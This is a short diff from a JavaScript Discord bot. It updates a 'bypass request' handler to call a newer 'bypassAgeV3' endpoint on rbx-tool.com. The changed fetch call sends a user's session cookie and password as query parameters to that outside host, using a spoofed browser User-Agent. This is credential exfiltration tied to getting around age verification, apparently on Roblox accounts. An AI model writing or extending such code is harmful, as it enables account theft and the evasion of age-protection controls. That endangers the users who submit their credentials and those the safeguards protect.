@@ -2578,7 +2578,7 @@ client.on('interactionCreate', async interaction => {
     await interaction.reply({ content: '<:yes:1393890949960306719> Processing bypass request...', ephemeral: true });
 
     try {
-      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
+      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV3?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
         method: 'GET',
         headers: {
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
